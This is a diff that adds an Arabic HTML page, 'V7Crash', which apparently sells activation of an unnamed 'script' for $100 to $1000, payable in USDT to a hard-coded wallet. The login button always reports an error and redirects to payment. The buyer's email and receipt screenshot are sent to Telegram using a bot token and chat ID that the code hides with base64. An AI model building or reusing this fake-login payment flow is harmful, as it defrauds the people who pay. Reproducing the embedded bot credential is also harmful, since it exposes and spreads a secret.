@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V7Crash</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            direction: rtl;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 350px;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: scale(1.05);
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #FFD700;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        p, ul {
+            font-size: 14px;
+            margin: 8px 0;
+        }
+
+        .wallet-address {
+            font-size: 14px;
+            color: #FFD700;
+            margin: 15px 0;
+            word-break: break-all;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .wallet-address:hover {
+            transform: scale(1.1);
+        }
+
+        button {
+            font-size: 14px;
+            padding: 10px;
+            margin-top: 15px;
+            width: 80%;
+            max-width: 300px;
+            border-radius: 10px;
+            border: none;
+            background: linear-gradient(145deg, #ff6347, #e74c3c);
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        button:hover {
+            background-color: #ff4500;
+            transform: scale(1.05);
+        }
+
+        .note {
+            font-size: 12px;
+            margin-top: 8px;
+            color: #f0f0f0;
+        }
+
+        .next-button-container {
+            margin-top: 20px;
+        }
+
+        input[type="email"], input[type="file"] {
+            font-size: 12px;
+            padding: 10px;
+            width: 80%;
+            max-width: 300px;
+            margin: 10px auto;
+            border-radius: 10px;
+            border: 2px solid #ff6347;
+            background: rgba(0, 0, 0, 0.6);
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        input[type="email"]:focus, input[type="file"]:focus {
+            border-color: #FFD700;
+            box-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
+            outline: none;
+        }
+
+        #loginPage {
+            z-index: 10;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
+            max-width: 400px;
+            width: 100%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        h1 {
+            font-size: 32px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 40px;
+            color: #ff6347;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes glowText {
+            0% {
+                color: #ff6347;
+                text-shadow: 0 0 20px #ff6347, 0 0 30px #ff6347;
+            }
+            100% {
+                color: #FFD700;
+                text-shadow: 0 0 20px #FFD700, 0 0 30px #FFD700;
+            }
+        }
+
+        h1 {
+            animation: glowText 1.5s infinite alternate;
+        }
+
+        input[type="text"], input[type="password"] {
+            padding: 14px;
+            font-size: 16px;
+            margin-top: 20px;
+            width: 80%;
+            max-width: 350px;
+            border-radius: 10px;
+            border: 2px solid #ff6347;
+            background: rgba(0, 0, 0, 0.6);
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #FFD700;
+            box-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
+            outline: none;
+        }
+
+        .login-btn {
+            background-color: #4CAF50;
+            font-size: 18px;
+            padding: 14px 30px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #45a049;
+            transform: scale(1.1);
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 30px;
+        }
+
+        .button-container button {
+            font-size: 16px;
+            padding: 12px 30px;
+            background: linear-gradient(145deg, #ff6347, #e74c3c);
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .button-container button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 15px rgba(255, 99, 71, 0.5);
+        }
+
+        .message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #FFD700;
+            padding: 10px;
+            border-radius: 15px;
+            font-size: 14px;
+            z-index: 9999;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الرسائل -->
+    <div class="message" id="message"></div>
+
+    <!-- صفحة تسجيل الدخول -->
+    <div id="loginPage">
+        <h1>تسجيل الدخول</h1>
+        <input type="text" id="username" placeholder="اسم المستخدم" />
+        <input type="password" id="password" placeholder="كلمة المرور" />
+        <button class="login-btn" onclick="login()">دخول</button>
+
+        <!-- زر الانتقال إلى صفحة "تفعيل" -->
+        <button onclick="goToPaymentPage()">تفعيل</button>
+    </div>
+
+    <!-- صفحة تفعيل -->
+    <div class="container" id="paymentPage" style="display: none;">
+        <h1>تفعيل</h1>
+
+        <p><strong>محفظة USDT TRC20:</strong></p>
+        <p class="wallet-address" onclick="copyWallet()">TL344teHLukh2FwoGbU2bFnoELPDZQr8Rw</p>
+        <p>لإتمام الدفع، قم بتحويل المبلغ المطلوب إلى المحفظة المذكورة التحويل عبر USDT TRC20</p>
+
+        <p><strong>الأسعار التفعيل: </strong></p>
+        <ul>
+            <li>تفعيل ساعة: 100 دولار</li>
+            <li>تفعيل أربع ساعات: 390 دولار</li>
+            <li>تفعيل اسبوع: 1000 دولار (عرض)</li>
+            <li>في أول اشتراك معنا سوف تاخذ ضعف وقتك X3</li>
+        </ul>
+
+        <div>
+            <p class="note">يرجى إدخال بريدك الإلكتروني ليتم إرسال اسم المستخدم وكلمة المرور الخاصة بالسكريبت لتفعيلة.</p>
+            <input type="email" id="email" placeholder="أدخل إيميلك" />
+
+            <p class="note">بعد التحويل، يرجى رفع صورة من التحويل الناجح (سكرين شوت أو صورة من الإيصال) لتأكيد الدفع.</p>
+            <input type="file" id="screenshot" accept=".jpg, .jpeg, .png" />
+        </div>
+
+        <p class="note">بعد تاكيد المعلومات اضغط علي "إرسال تفاصيل الدفع" وسيتم المعالجة وارسال تفاصيل الاشتراك على بريدك الإلكتروني.</p>
+        <button onclick="submitPayment()">إرسال تفاصيل الدفع</button>
+
+        <div class="next-button-container">
+            <p class="note">اضغط علي "تسجيل الدخول" وأدخل اسم المستخدم وكلمة المرور لبدء التشغيل.</p>
+            <button onclick="goToLoginPage()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <script>
+        function showMessage(message) {
+            const messageBox = document.getElementById('message');
+            messageBox.textContent = message;
+            messageBox.style.display = 'block';
+
+            setTimeout(() => {
+                messageBox.style.display = 'none';
+            }, 3000); // تختفي بعد 3 ثواني
+        }
+
+        function copyWallet() {
+            const walletAddress = document.querySelector('.wallet-address').textContent;
+            navigator.clipboard.writeText(walletAddress)
+                .then(() => showMessage('تم نسخ المحفظة إلى الحافظة'))
+                .catch(() => showMessage('حدث خطأ أثناء نسخ المحفظة'));
+        }
+
+        function submitPayment() {
+            const email = document.getElementById('email').value.trim();
+            const screenshot = document.getElementById('screenshot').files[0];
+            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+
+            if (!emailPattern.test(email)) {
+                showMessage("من فضلك أدخل بريد إلكتروني صحيح.");
+                return;
+            }
+
+            if (!screenshot) {
+                showMessage("من فضلك قم برفع صورة التحويل.");
+                return;
+            }
+
+            const fileExtension = screenshot.name.split('.').pop().toLowerCase();
+            if (!['jpg', 'jpeg', 'png'].includes(fileExtension)) {
+                showMessage('يجب أن تكون صورة التحويل بتنسيق JPG أو PNG فقط.');
+                return;
+            }
+
+            // فك تشفير التوكن و chatId
+            const token = atob('NzkxNTA5NTA4MDpBQUZhOUp3U3B5Y3djLWFpMnFMUWpVRzlibVVqQjVfcTFpOA==');
+            const chatId = atob('MjA5NjI2ODc3Nw==');
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', screenshot);
+            formData.append('caption', `تفاصيل الدفع: \n\nالإيميل: ${email} \nالصورة: [تحويل مرفق]`);
+
+            // إرسال الصورة إلى تليجرام عبر API
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    showMessage(`فحال كانت معلومات الدفع صحيحة سيتم إرسال تفاصيل الاشتراك إلى بريدك الإلكتروني (${email}) بنجاح!`);
+                } else {
+                    showMessage('حدث خطاَ أثناء إرسال البيانات الينا يرجي المحاولة مره اخري.');
+                }
+            })
+            .catch(() => {
+                showMessage('حدث خطاَ أثناء إرسال البيانات الينا يرجي المحاولة مره اخري.');
+            });
+        }
+
+        function goToPaymentPage() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('paymentPage').style.display = 'block';
+        }
+
+        function goToLoginPage() {
+            document.getElementById('paymentPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+
+        function login() {
+            showMessage('خطا في تسجيل الدخول فحال ليس لديك تفعيل يرجي تفعيل حسابك اولا');
+            setTimeout(() => {
+                goToPaymentPage();
+            }, 3000); // الانتقال بعد 3 ثواني
+        }
+    </script>
+
+</body>
+</html>
